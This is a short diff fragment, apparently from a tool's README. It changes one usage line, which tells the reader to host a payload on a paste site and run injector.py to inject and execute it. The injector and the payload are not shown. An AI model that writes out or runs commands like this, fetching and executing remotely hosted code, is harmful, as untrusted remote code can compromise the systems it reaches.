@@ -8,5 +8,5 @@ Upload the payload anywhere you can host a text file.
 
 Inject and execute the payload:
 ```
-python3 injector.py https://paste-site.wherever
+python3 injector.py <https://paste-site.wherever>
 ```
